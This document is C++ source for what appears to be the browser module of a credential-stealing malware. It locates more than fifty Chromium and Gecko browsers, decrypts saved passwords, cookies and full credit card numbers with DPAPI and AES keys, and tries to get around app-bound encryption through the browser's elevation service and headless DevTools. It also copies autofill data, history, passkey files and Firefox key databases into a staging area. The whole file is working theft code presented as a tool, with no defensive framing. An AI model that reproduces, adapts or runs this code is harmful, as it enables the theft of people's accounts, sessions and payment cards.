// Browser credential/cookie/autofill/history collection.
//   - Chromium family: Local State master key (DPAPI) -> AES-256-GCM (v10/v11),
//     v20 app-bound best effort, DPAPI fallback; SQLite extraction of
//     logins/cookies/autofill/history, bookmarks JSON.
//   - Gecko family: modern logins.json (PBES2: PBKDF2-HMAC-SHA256 + AES-CBC),
//     cookies.sqlite plaintext, raw key material staged for offline work.
#include "../modules.h"
#include "../config.h"
#include "../core/obf.h"
#include "../core/sys.h"
#include "../core/b64.h"
#include "../core/crypto.h"
#include "../core/dpapi.h"
#include "../core/abe.h"
#include "../core/json.h"
#include "../core/log.h"

#include <sqlite3.h>
#include <sstream>
#include <regex>

namespace {

// ---------------- SQLite helper ----------------
struct Db {
    sqlite3* db = nullptr;
    ~Db() { if (db) sqlite3_close(db); }
    bool open_copy(const std::string& path) {
        // SQLite occasionally locks; copy to temp with share flags first.
        std::string tmp = util::join(util::temp_dir(), "u_" + util::filename_of(path));
        std::vector<uint8_t> data;
        if (!util::read_file(path, data) || data.empty()) {
            // try direct (some files are already unlocked)
            return sqlite3_open_v2(path.c_str(), &db, SQLITE_OPEN_READONLY, nullptr) == SQLITE_OK;
        }
        if (!util::write_file(tmp, data)) return false;
        bool ok = sqlite3_open_v2(tmp.c_str(), &db, SQLITE_OPEN_READONLY, nullptr) == SQLITE_OK;
        util::remove_path(tmp);
        return ok;
    }
    std::vector<std::vector<std::string>> query(const char* sql) {
        std::vector<std::vector<std::string>> rows;
        sqlite3_stmt* st = nullptr;
        if (!db || sqlite3_prepare_v2(db, sql, -1, &st, nullptr) != SQLITE_OK) return rows;
        int cols = sqlite3_column_count(st);
        while (sqlite3_step(st) == SQLITE_ROW) {
            std::vector<std::string> row;
            for (int i = 0; i < cols; ++i) {
                const int type = sqlite3_column_type(st, i);
                auto txt = sqlite3_column_text(st, i);
                auto blob = (const char*)sqlite3_column_blob(st, i);
                int blen = sqlite3_column_bytes(st, i);
                // Encrypted values are BLOBs full of NUL bytes: going through
                // column_text would truncate them at the first NUL. Always take
                // the raw bytes for blob columns.
                if (type == SQLITE_BLOB && blob && blen > 0) row.emplace_back(blob, blen);
                else if (txt) row.emplace_back((const char*)txt);
                else if (blob && blen > 0) row.emplace_back(blob, blen);
                else row.emplace_back();
            }
            rows.push_back(std::move(row));
        }
        sqlite3_finalize(st);
        return rows;
    }
    void exec_script(const char* sql) { if (db) sqlite3_exec(db, sql, nullptr, nullptr, nullptr); }
};

// ---------------- Chromium surfaces ----------------
struct BrowserPath { std::string name; std::string user_data; bool single_profile; };

std::vector<BrowserPath> chromium_variants() {
    std::vector<BrowserPath> v;
    auto add = [&](const char* envvar, const char* rel, const char* name, bool single = false) {
        std::string base = util::expand_env(envvar);
        if (base.empty()) return;
        v.push_back({name, util::join(base, rel), single});
    };
    // Chrome family
    add("%LOCALAPPDATA%", "Google\\Chrome\\User Data", "Chrome");
    add("%LOCALAPPDATA%", "Google\\Chrome Beta\\User Data", "Chrome Beta");
    add("%LOCALAPPDATA%", "Google\\Chrome Dev\\User Data", "Chrome Dev");
    add("%LOCALAPPDATA%", "Google\\Chrome SxS\\User Data", "Chrome Canary");
    add("%LOCALAPPDATA%", "Chromium\\User Data", "Chromium");
    // Edge family
    add("%LOCALAPPDATA%", "Microsoft\\Edge\\User Data", "Edge");
    add("%LOCALAPPDATA%", "Microsoft\\Edge Beta\\User Data", "Edge Beta");
    add("%LOCALAPPDATA%", "Microsoft\\Edge Dev\\User Data", "Edge Dev");
    // Brave
    add("%LOCALAPPDATA%", "BraveSoftware\\Brave-Browser\\User Data", "Brave");
    add("%LOCALAPPDATA%", "BraveSoftware\\Brave-Browser-Beta\\User Data", "Brave Beta");
    add("%LOCALAPPDATA%", "BraveSoftware\\Brave-Browser-Nightly\\User Data", "Brave Nightly");
    // Opera (profile files live directly under the stable dir)
    add("%APPDATA%", "Opera Software\\Opera Stable", "Opera Stable", true);
    add("%APPDATA%", "Opera Software\\Opera GX Stable", "Opera GX", true);
    add("%APPDATA%", "Opera Software\\Opera Crypto Stable", "Opera Crypto", true);
    add("%APPDATA%", "Opera Software\\Opera Neon\\User Data", "Opera Neon");
    add("%APPDATA%", "Opera Software\\Opera Air Stable", "Opera Air", true);
    // AI-era browsers
    add("%LOCALAPPDATA%", "Perplexity\\Comet\\User Data", "Comet");
    // Vivaldi / Yandex
    add("%LOCALAPPDATA%", "Vivaldi\\User Data", "Vivaldi");
    add("%LOCALAPPDATA%", "Yandex\\YandexBrowser\\User Data", "Yandex");
    add("%APPDATA%", "Yandex\\YandexBrowser\\User Data", "Yandex (roaming)");
    // Others (alphabetical)
    add("%LOCALAPPDATA%", "360Browser\\Browser\\User Data", "360Browser");
    add("%APPDATA%", "360se6\\User Data", "360se");
    add("%LOCALAPPDATA%", "7Star\\7Star\\User Data", "7Star");
    add("%LOCALAPPDATA%", "Amigo\\User Data", "Amigo");
    add("%LOCALAPPDATA%", "Packages\\TheBrowserCompany.Arc_ttt1ap7aakyb4\\LocalCache\\Local\\Arc\\User Data", "Arc");
    add("%LOCALAPPDATA%", "Arc\\User Data", "Arc (legacy)");
    add("%LOCALAPPDATA%", "Atom\\User Data", "Atom");
    add("%LOCALAPPDATA%", "AVAST Software\\Browser\\User Data", "Avast");
    add("%LOCALAPPDATA%", "AVG\\Browser\\User Data", "AVG");
    add("%LOCALAPPDATA%", "CatalinaGroup\\Citrio\\User Data", "Citrio");
    add("%LOCALAPPDATA%", "CentBrowser\\User Data", "CentBrowser");
    add("%LOCALAPPDATA%", "Chedot\\User Data", "Chedot");
    add("%LOCALAPPDATA%", "Coowon\\Coowon\\User Data", "Coowon");
    add("%LOCALAPPDATA%", "CocCoc\\Browser\\User Data", "CocCoc");
    add("%LOCALAPPDATA%", "Comodo\\Dragon\\User Data", "Dragon");
    add("%LOCALAPPDATA%", "Comodo\\User Data", "Comodo");
    add("%LOCALAPPDATA%", "Elements Browser\\User Data", "Elements");
    add("%LOCALAPPDATA%", "Epic Privacy Browser\\User Data", "Epic");
    add("%LOCALAPPDATA%", "Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer", "Sleipnir", true);
    add("%LOCALAPPDATA%", "Iridium\\User Data", "Iridium");
    add("%LOCALAPPDATA%", "Kometa\\User Data", "Kometa");
    add("%LOCALAPPDATA%", "K-Melon\\User Data", "K-Melon");
    add("%LOCALAPPDATA%", "liebao\\User Data", "Liebao");
    add("%LOCALAPPDATA%", "MapleStudio\\ChromePlus\\User Data", "ChromePlus");
    add("%LOCALAPPDATA%", "Nichrome\\User Data", "Nichrome");
    add("%LOCALAPPDATA%", "Orbitum\\User Data", "Orbitum");
    add("%LOCALAPPDATA%", "QIP Surf\\User Data", "QIP Surf");
    add("%LOCALAPPDATA%", "RockMelt\\User Data", "RockMelt");
    add("%LOCALAPPDATA%", "Slimjet\\User Data", "Slimjet");
    add("%LOCALAPPDATA%", "Sputnik\\Sputnik\\User Data", "Sputnik");
    add("%LOCALAPPDATA%", "Torch\\User Data", "Torch");
    add("%LOCALAPPDATA%", "uCozMedia\\Uran\\User Data", "Uran");
    add("%APPDATA%", "Tencent\\QQBrowser\\User Data", "QQBrowser");
    add("%APPDATA%", "2345Explorer\\User Data", "2345Explorer");
    add("%APPDATA%", "SogouExplorer\\User Data", "Sogou");
    add("%APPDATA%", "Baidu\\BaiduSpark\\User Data", "BaiduSpark");
    add("%LOCALAPPDATA%", "Maxthon3\\User Data", "Maxthon");
    add("%APPDATA%", "Thunder Network\\XMP\\Chrome\\User Data", "Thunder");
    add("%LOCALAPPDATA%", "Wavebox\\User Data", "Wavebox");
    add("%LOCALAPPDATA%", "UCBrowser\\User Data", "UCBrowser");
    add("%LOCALAPPDATA%", "GhostBrowser\\User Data", "Ghost");
    add("%LOCALAPPDATA%", "NordVPN\\NordVPN.exe\\User Data", "NordVPN browser");
    // Discord/other electron apps are handled in their own modules
    return v;
}

// list profiles inside a user_data dir ("Default", "Profile 1", ..., special)
std::vector<std::string> chromium_profiles(const std::string& user_data, bool single) {
    std::vector<std::string> out;
    auto has_data = [](const std::string& dir) {
        return util::path_exists(util::join(dir, "Login Data")) ||
               util::path_exists(util::join(dir, "Network\\Cookies")) ||
               util::path_exists(util::join(dir, "Cookies"));
    };
    if (single) {
        if (has_data(user_data)) out.push_back(user_data);
        return out;
    }
    for (auto& sub : util::list_subdirs(user_data)) {
        std::string name = util::filename_of(sub);
        std::string lower = util::to_lower(name);
        if (lower == "default" || util::starts_with(lower, "profile") ||
            lower == "guest profile" || lower == "system profile") {
            if (has_data(sub)) out.push_back(sub);
        }
    }
    return out;
}

struct ChromiumKeys {
    std::vector<uint8_t> master;     // AES-256 key from Local State (v10/v11)
    std::vector<uint8_t> app_bound;  // v20 key if decryption succeeded
    bool has_master = false;
    bool has_app_bound = false;
    bool abe_present = false;        // Local State carries an app-bound key
};

ChromiumKeys load_keys(const std::string& user_data, const std::string& browser_name = "") {
    ChromiumKeys k;
    util::json js;
    if (!util::read_json_file(util::join(user_data, "Local State"), js)) return k;
    try {
        if (js.contains("os_crypt") && js["os_crypt"].contains("encrypted_key")) {
            auto raw = util::b64_decode(js["os_crypt"]["encrypted_key"].get<std::string>());
            if (raw.size() > 5) {
                std::vector<uint8_t> blob(raw.begin() + 5, raw.end()); // strip "DPAPI"
                auto dec = dpapi::unprotect(blob);
                if (dec && dec->size() == 32) { k.master = *dec; k.has_master = true; }
            }
        }
        if (js.contains("os_crypt") && js["os_crypt"].contains("app_bound_encrypted_key")) {
            auto raw = util::b64_decode(js["os_crypt"]["app_bound_encrypted_key"].get<std::string>());
            if (raw.size() > 4) {
                std::vector<uint8_t> blob(raw.begin() + 4, raw.end()); // strip "APPB"
                k.abe_present = true;
                // 1) elevation service (works when path validation passes)
                auto key = abe::via_elevator(blob, browser_name);
                if (key.size() == 32) {
                    k.app_bound = key;
                    k.has_app_bound = true;
                } else {
                    // 2) keep the doubly-wrapped blob for offline unwrapping
                    std::string label = browser_name.empty() ? "unknown" : browser_name;
                    label = util::replace_all(label, " ", "_");
                    stage::stage_bytes("browsers", "appbound_key_" + label + ".bin", blob);
                }
            }
        }
    } catch (...) {}
    return k;
}

std::string decrypt_chromium_value(const std::string& cipher, const ChromiumKeys& keys, bool& failed) {
    failed = false;
    if (cipher.size() < 4) return cipher;
    auto starts = [&](const char* p) { return cipher.compare(0, 3, p) == 0; };
    if ((starts("v10") || starts("v11")) && keys.has_master) {
        std::vector<uint8_t> raw(cipher.begin(), cipher.end());
        if (raw.size() > 15 + 16) {
            std::vector<uint8_t> nonce(raw.begin() + 3, raw.begin() + 15);
            std::vector<uint8_t> tag(raw.end() - 16, raw.end());
            std::vector<uint8_t> ct(raw.begin() + 15, raw.end() - 16);
            auto pt = crypto::aes_gcm_decrypt(keys.master, nonce, ct, tag);
            if (pt) return std::string(pt->begin(), pt->end());
        }
        failed = true;
        return "[aes-gcm failed]";
    }
    if (starts("v20")) {
        if (keys.has_app_bound) {
            std::vector<uint8_t> raw(cipher.begin(), cipher.end());
            // standard layout: v20 + nonce(12) + ct + tag(16); some forks carry
            // a 32-byte metadata header - retry past it. AAD variants are tried
            // both ways (plain and with the "v20" marker).
            for (size_t skip : {size_t(0), size_t(32)}) {
                if (raw.size() <= 3 + skip + 12 + 16) continue;
                std::vector<uint8_t> nonce(raw.begin() + 3 + skip, raw.begin() + 15 + skip);
                std::vector<uint8_t> tag(raw.end() - 16, raw.end());
                std::vector<uint8_t> ct(raw.begin() + 15 + skip, raw.end() - 16);
                auto pt = crypto::aes_gcm_decrypt(keys.app_bound, nonce, ct, tag);
                if (!pt) {
                    std::vector<uint8_t> aad = {'v', '2', '0'};
                    pt = crypto::aes_gcm_decrypt(keys.app_bound, nonce, ct, tag, aad);
                }
                if (pt) return std::string(pt->begin(), pt->end());
            }
        }
        failed = true;
        return "[v20 locked]";
    }
    // legacy DPAPI
    std::vector<uint8_t> raw(cipher.begin(), cipher.end());
    auto dec = dpapi::unprotect(raw);
    if (dec) return std::string(dec->begin(), dec->end());
    failed = true;
    return "[dpapi failed]";
}

void collect_chromium_profile(const BrowserPath& b, const std::string& profile_dir,
                              const ChromiumKeys& keys, const std::string& staging,
                              std::ostringstream& summary) {
    std::string prof_name = util::filename_of(profile_dir);
    std::string tag = b.name + "_" + prof_name;
    tag = util::replace_all(tag, " ", "_");

    // ---- passwords ----
    {
        Db db;
        if (db.open_copy(util::join(profile_dir, "Login Data"))) {
            auto rows = db.query("SELECT origin_url, username_value, password_value FROM logins");
            std::ostringstream out;
            int ok = 0, fail = 0;
            for (auto& r : rows) {
                if (r.size() < 3) continue;
                if (r[1].empty() && r[2].empty()) continue;
                bool failed = false;
                std::string pw = decrypt_chromium_value(r[2], keys, failed);
                if (failed) fail++; else ok++;
                out << "url: " << r[0] << "\r\nuser: " << r[1] << "\r\npass: " << pw << "\r\n---\r\n";
            }
            if (ok || fail) {
                stage::stage_text("browsers", tag + "_passwords.txt", out.str());
                summary << "  " << b.name << "/" << prof_name << ": " << ok << " passwords";
                if (fail) summary << " (" << fail << " undecrypted)";
                summary << "\r\n";
            }
        }
    }

    // ---- cookies ---- (Network\Cookies since v96, legacy Cookies before)
    {
        std::string cookie_path = util::join(profile_dir, "Network\\Cookies");
        if (!util::path_exists(cookie_path)) cookie_path = util::join(profile_dir, "Cookies");
        Db db;
        if (db.open_copy(cookie_path)) {
            auto rows = db.query("SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies");
            std::ostringstream out;
            int ok = 0, locked = 0;
            for (auto& r : rows) {
                if (r.size() < 3) continue;
                bool failed = false;
                std::string val = decrypt_chromium_value(r[2], keys, failed);
                if (failed && val == "[v20 locked]") {
                    locked++;
                    continue; // raw db staged below for offline work
                }
                ok++;
                out << r[0] << "\t" << r[1] << "\t" << val << "\t" << r[3] << "\r\n";
            }
            if (ok) {
                stage::stage_text("browsers", tag + "_cookies.txt", out.str());
                summary << "  " << b.name << "/" << prof_name << ": " << ok << " cookies\r\n";
            }
            if (locked) {
                // stage the raw cookie DB when v20 blocks decryption
                std::vector<uint8_t> raw;
                if (util::read_file(cookie_path, raw))
                    stage::stage_bytes("browsers", tag + "_cookies.db.locked", raw);
                summary << "  " << b.name << "/" << prof_name << ": " << locked
                        << " v20-locked cookies (raw db staged)\r\n";
            }
        }
    }

    // ---- autofill ----
    {
        Db db;
        if (db.open_copy(util::join(profile_dir, "Web Data"))) {
            auto rows = db.query("SELECT name, value FROM autofill");
            std::ostringstream out;
            int n = 0;
            for (auto& r : rows) {
                if (r.size() < 2 || r[1].empty()) continue;
                out << r[0] << ": " << r[1] << "\r\n";
                n++;
            }
            if (n) {
                stage::stage_text("browsers", tag + "_autofill.txt", out.str());
                summary << "  " << b.name << "/" << prof_name << ": " << n << " autofill entries\r\n";
            }
        }
    }

    // ---- credit cards: the full PAN, decrypted with the same key material ----
    {
        Db db;
        if (db.open_copy(util::join(profile_dir, "Web Data"))) {
            auto rows = db.query("SELECT name_on_card, expiration_month, expiration_year, "
                                 "card_number_encrypted, nickname, guid FROM credit_cards");
            std::ostringstream out;
            int n = 0;
            for (auto& r : rows) {
                if (r.size() < 4 || r[3].empty()) continue;
                bool failed = false;
                std::string number = decrypt_chromium_value(r[3], keys, failed);
                ++n;
                out << "card " << n << ": " << (r[0].empty() ? "(no name)" : r[0])
                    << " | expires " << (r.size() > 1 && !r[1].empty() ? r[1] : "??") << "/"
                    << (r.size() > 2 && !r[2].empty() ? r[2] : "????")
                    << " | number " << (failed ? "[encrypted - raw staged]" : number);
                if (r.size() > 4 && !r[4].empty()) out << " | nickname " << r[4];
                if (r.size() > 5 && !r[5].empty()) out << " | guid " << r[5];
                out << "\r\n";
                if (failed)
                    stage::stage_bytes("browsers", tag + "_card" + std::to_string(n) + ".enc",
                                       std::vector<uint8_t>(r[3].begin(), r[3].end()));
            }
            if (n) {
                stage::stage_text("browsers", tag + "_cards.txt", out.str());
                summary << "  " << b.name << "/" << prof_name << ": " << n << " credit card(s)\r\n";
            }
        }
    }

    // ---- history (top visits + search terms) ----
    {
        Db db;
        if (db.open_copy(util::join(profile_dir, "History"))) {
            auto rows = db.query("SELECT url, title, visit_count FROM urls "
                                 "ORDER BY last_visit_time DESC LIMIT 3000");
            std::ostringstream out;
            for (auto& r : rows) {
                if (r.size() < 3) continue;
                out << r[2] << "x " << r[0] << " | " << r[1] << "\r\n";
            }
            if (!rows.empty()) {
                stage::stage_text("browsers", tag + "_history.txt", out.str());
                summary << "  " << b.name << "/" << prof_name << ": " << rows.size() << " history urls\r\n";
            }
            // downloads list
            auto dls = db.query("SELECT target_path, tab_url FROM downloads ORDER BY start_time DESC LIMIT 500");
            if (!dls.empty()) {
                std::ostringstream dout;
                for (auto& r : dls)
                    if (r.size() >= 2) dout << r[0] << " <- " << r[1] << "\r\n";
                stage::stage_text("browsers", tag + "_downloads.txt", dout.str());
            }
        }
    }

    // ---- bookmarks (JSON copy + flattened) ----
    {
        util::json bm;
        std::string bmp = util::join(profile_dir, "Bookmarks");
        if (util::read_json_file(bmp, bm)) {
            std::vector<uint8_t> raw;
            if (util::read_file(bmp, raw)) stage::stage_bytes("browsers", tag + "_bookmarks.json", raw);
        }
    }

    // ---- passkeys (WebAuthn): per-profile key files written by the browser ----
    {
        std::string wa = util::join(profile_dir, "WebAuthn");
        if (util::is_dir(wa)) {
            int n = 0;
            for (auto& f : util::walk_files(wa, 2, {})) {
                std::vector<uint8_t> raw;
                if (util::read_file(f, raw) && !raw.empty()) {
                    stage::stage_bytes("browsers", tag + "_webauthn_" + util::filename_of(f), raw);
                    n++;
                }
            }
            if (n) summary << "  " << b.name << "/" << prof_name << ": " << n << " passkey file(s)\r\n";
        }
    }
}

// ---------------- Gecko surfaces ----------------
struct GeckoPath { std::string name; std::string profiles_root; };

std::vector<GeckoPath> gecko_variants() {
    std::vector<GeckoPath> v;
    auto add = [&](const char* rel, const char* name) {
        std::string base = util::expand_env("%APPDATA%");
        if (base.empty()) return;
        v.push_back({name, util::join(base, rel)});
    };
    add("Mozilla\\Firefox\\Profiles", "Firefox");
    add("Waterfox\\Profiles", "Waterfox");
    add("Waterfox\\Profiles", "Waterfox classic");
    add("Moonchild Productions\\Pale Moon\\Profiles", "Pale Moon");
    add("Moonchild Productions\\Basilisk\\Profiles", "Basilisk");
    add("librewolf\\Profiles", "LibreWolf");
    add("Floorp\\Profiles", "Floorp");
    add("zen\\Profiles", "Zen");
    add("Mullvad\\Profiles", "Mullvad");
    add("K-Meleon\\Profiles", "K-Meleon");
    add("8pecxstudios\\Cyberfox\\Profiles", "Cyberfox");
    add("Comodo\\IceDragon\\Profiles", "IceDragon");
    add("Mozilla\\SeaMonkey\\Profiles", "SeaMonkey");
    add("Mozilla\\Thunderbird\\Profiles", "Thunderbird"); // mail handled too
    add("PostboxApp\\Profiles", "Postbox");
    return v;
}

// Decode one PBES2-wrapped logins.json field:
// SEQUENCE { SEQUENCE { OID PBES2, SEQUENCE { SEQ{OID PBKDF2, SEQ{OCTET entry_salt, INT it}},
//            SEQ{OID aes-256-cbc, OCTET iv} } }, OCTET STRING ciphertext }
std::string decode_gecko_login_field(const std::string& b64) {
    auto der = util::b64_decode(b64);
    if (der.size() < 32 || der[0] != 0x30) return "";

    auto read_len = [&](size_t& pos) -> size_t {
        if (pos >= der.size()) return 0;
        uint8_t l = der[pos++];
        if (l < 0x80) return l;
        int n = l & 0x7F;
        if (n > 4 || pos + n > der.size()) return 0;
        size_t v = 0;
        for (int i = 0; i < n; ++i) v = (v << 8) | der[pos++];
        return v;
    };

    // scan for the PBES2 OID pattern: 2a 86 48 86 f7 0d 01 05 0d
    static const uint8_t pbes2_pat[] = {0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x05, 0x0d};
    size_t oid_at = std::string::npos;
    for (size_t i = 0; i + sizeof(pbes2_pat) <= der.size(); ++i) {
        if (!memcmp(der.data() + i, pbes2_pat, sizeof(pbes2_pat))) { oid_at = i; break; }
    }
    if (oid_at == std::string::npos) return "";

    // entry salt: first OCTET STRING after OID PBKDF2 (2a 86 48 86 f7 0d 01 05 0c)
    static const uint8_t pbkdf2_pat[] = {0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x05, 0x0c};
    size_t pbkdf2_at = std::string::npos;
    for (size_t i = oid_at; i + sizeof(pbkdf2_pat) <= der.size(); ++i) {
        if (!memcmp(der.data() + i, pbkdf2_pat, sizeof(pbkdf2_pat))) { pbkdf2_at = i; break; }
    }
    if (pbkdf2_at == std::string::npos) return "";

    // after PBKDF2 OID there's SEQUENCE { OCTET salt, INTEGER iters }
    size_t pos = pbkdf2_at + sizeof(pbkdf2_pat);
    // skip sequence header heuristically: find next 0x04 within 8 bytes
    std::vector<uint8_t> entry_salt;
    size_t oct_pos = std::string::npos;
    for (size_t i = pos; i < der.size() && i < pos + 8; ++i)
        if (der[i] == 0x04) { oct_pos = i; break; }
    if (oct_pos == std::string::npos) return "";
    {
        size_t p = oct_pos + 1;
        size_t len = read_len(p);
        if (!len || p + len > der.size()) return "";
        entry_salt.assign(der.begin() + p, der.begin() + p + len);
        pos = p + len;
    }

    // iterations: find 0x02 INTEGER after entry salt
    uint32_t iterations = 0;
    for (size_t i = pos; i < der.size() && i < pos + 8; ++i) {
        if (der[i] == 0x02) {
            size_t p = i + 1;
            size_t len = read_len(p);
            if (len >= 1 && len <= 4 && p + len <= der.size()) {
                for (size_t j = 0; j < len; ++j) iterations = (iterations << 8) | der[p + j];
            }
            pos = p + len;
            break;
        }
    }
    if (!iterations) return "";

    // iv: OCTET STRING after the AES OID (..04 01 2a == aes256-cbc ..2.42)
    static const uint8_t aes256_pat[] = {0x60, 0x86, 0x48, 0x01, 0x65, 0x03, 0x04, 0x01, 0x2a};
    size_t aes_at = std::string::npos;
    for (size_t i = pos; i + sizeof(aes256_pat) <= der.size(); ++i) {
        if (!memcmp(der.data() + i, aes256_pat, sizeof(aes256_pat))) { aes_at = i; break; }
    }
    if (aes_at == std::string::npos) return "";
    std::vector<uint8_t> iv;
    size_t iv_pos = std::string::npos;
    for (size_t i = aes_at + sizeof(aes256_pat); i < der.size() && i < aes_at + sizeof(aes256_pat) + 8; ++i)
        if (der[i] == 0x04) { iv_pos = i; break; }
    if (iv_pos == std::string::npos) return "";
    {
        size_t p = iv_pos + 1;
        size_t len = read_len(p);
        if (!len || p + len > der.size()) return "";
        iv.assign(der.begin() + p, der.begin() + p + len);
    }

    // ciphertext: last OCTET STRING in the structure
    std::vector<uint8_t> ct;
    {
        size_t p = 1; // after outer SEQUENCE tag
        size_t outer_len = read_len(p);
        (void)outer_len;
        // find the LAST 0x04 with valid length containing remaining data
        size_t best = std::string::npos;
        for (size_t i = p; i + 2 < der.size(); ++i) {
            if (der[i] == 0x04) {
                size_t q = i + 1;
                size_t len = read_len(q);
                if (len && q + len <= der.size() && q + len == der.size()) { best = i; break; }
            }
        }
        if (best == std::string::npos) return "";
        size_t q = best + 1;
        size_t len = read_len(q);
        ct.assign(der.begin() + q, der.begin() + q + len);
    }

    auto key = crypto::pbkdf2_sha256({}, entry_salt, iterations, 32);
    if (key.size() != 32) return "";
    auto pt = crypto::aes_cbc_decrypt(key, iv, ct, true);
    if (!pt) return "";
    return std::string(pt->begin(), pt->end());
}

void collect_gecko_profile(const GeckoPath& g, const std::string& profile_dir,
                           const std::string& staging, std::ostringstream& summary) {
    std::string tag = g.name + "_" + util::filename_of(profile_dir);
    tag = util::replace_all(tag, " ", "_");
    std::string prof_name = util::filename_of(profile_dir);

    // ---- logins.json ----
    util::json logins;
    std::string lp = util::join(profile_dir, "logins.json");
    if (util::read_json_file(lp, logins)) {
        std::ostringstream out;
        int ok = 0, fail = 0;
        try {
            if (logins.contains("logins")) {
                for (auto& login : logins["logins"]) {
                    std::string host = login.value("hostname", "");
                    std::string user = login.value("encryptedUsername", "");
                    std::string pass = login.value("encryptedPassword", "");
                    std::string user_dec = decode_gecko_login_field(user);
                    std::string pass_dec = decode_gecko_login_field(pass);
                    if (user_dec.empty() && pass_dec.empty()) {
                        fail++;
                        continue;
                    }
                    ok++;
                    out << "url: " << host << "\r\nuser: " << user_dec << "\r\npass: " << pass_dec << "\r\n---\r\n";
                }
            }
        } catch (...) {}
        if (ok) {
            stage::stage_text("browsers", tag + "_passwords.txt", out.str());
            summary << "  " << g.name << "/" << prof_name << ": " << ok << " passwords (gecko)\r\n";
        }
        if (fail) {
            // master password set or legacy scheme: stage raw for offline
            std::vector<uint8_t> raw;
            if (util::read_file(lp, raw)) stage::stage_bytes("browsers", tag + "_logins.json", raw);
            summary << "  " << g.name << "/" << prof_name << ": " << fail
                    << " locked logins (raw staged)\r\n";
        }
    }

    // ---- cookies.sqlite ----
    {
        Db db;
        if (db.open_copy(util::join(profile_dir, "cookies.sqlite"))) {
            auto rows = db.query("SELECT host, name, value, path FROM moz_cookies");
            std::ostringstream out;
            int n = 0;
            for (auto& r : rows) {
                if (r.size() < 4) continue;
                out << r[0] << "\t" << r[1] << "\t" << r[2] << "\t" << r[3] << "\r\n";
                n++;
            }
            if (n) {
                stage::stage_text("browsers", tag + "_cookies.txt", out.str());
                summary << "  " << g.name << "/" << prof_name << ": " << n << " cookies (gecko)\r\n";
            }
        }
    }

    // ---- history + key material raw copies ----
    {
        std::string places = util::join(profile_dir, "places.sqlite");
        if (util::path_exists(places)) {
            Db db;
            if (db.open_copy(places)) {
                auto rows = db.query("SELECT url, title FROM moz_places WHERE url IS NOT NULL "
                                     "ORDER BY last_visit_date DESC LIMIT 2000");
                std::ostringstream out;
                for (auto& r : rows)
                    if (r.size() >= 2) out << r[0] << " | " << r[1] << "\r\n";
                if (!rows.empty())
                    stage::stage_text("browsers", tag + "_history.txt", out.str());
            }
        }
        for (auto f : { "key4.db", "cert9.db", "logins-backup.json" }) {
            std::string p = util::join(profile_dir, f);
            if (util::path_exists(p)) {
                std::vector<uint8_t> raw;
                if (util::read_file(p, raw))
                    stage::stage_bytes("browsers", tag + "_" + f, raw);
            }
        }
    }
}

} // namespace

namespace mod {

void browsers(const std::string& staging) {
    std::ostringstream summary;

    // ---- Chromium ----
    for (auto& b : chromium_variants()) {
        if (!util::is_dir(b.user_data)) continue;
        ChromiumKeys keys = load_keys(b.user_data, b.name);
        auto profiles = chromium_profiles(b.user_data, b.single_profile);
        if (profiles.empty()) continue;
        summary << b.name << " (" << util::filename_of(b.user_data) << "):\r\n";
        for (auto& p : profiles)
            collect_chromium_profile(b, p, keys, staging, summary);

        // App-bound cookies: with an ABE key present, ask the browser itself
        // through headless DevTools - it decrypts every cookie (v10/v11/v20).
        if (keys.abe_present) {
            std::string dec = abe::cookies_via_devtools(b.name, "", b.user_data);
            if (!dec.empty()) {
                std::string fname = util::replace_all(b.name, " ", "_") + "_cookies_decrypted.txt";
                stage::stage_text("browsers", fname, dec);
                summary << "  " << b.name << ": cookies decrypted via DevTools\r\n";
            }
        }
    }

    // ---- Gecko ----
    for (auto& g : gecko_variants()) {
        if (!util::is_dir(g.profiles_root)) continue;
        for (auto& prof : util::list_subdirs(g.profiles_root)) {
            if (!util::path_exists(util::join(prof, "logins.json")) &&
                !util::path_exists(util::join(prof, "cookies.sqlite")))
                continue;
            collect_gecko_profile(g, prof, staging, summary);
        }
    }

    stage::stage_text("browsers", "_summary.txt", summary.str());
    stage::note("browsers", "scan complete");
    (void)staging;
}

} // namespace mod
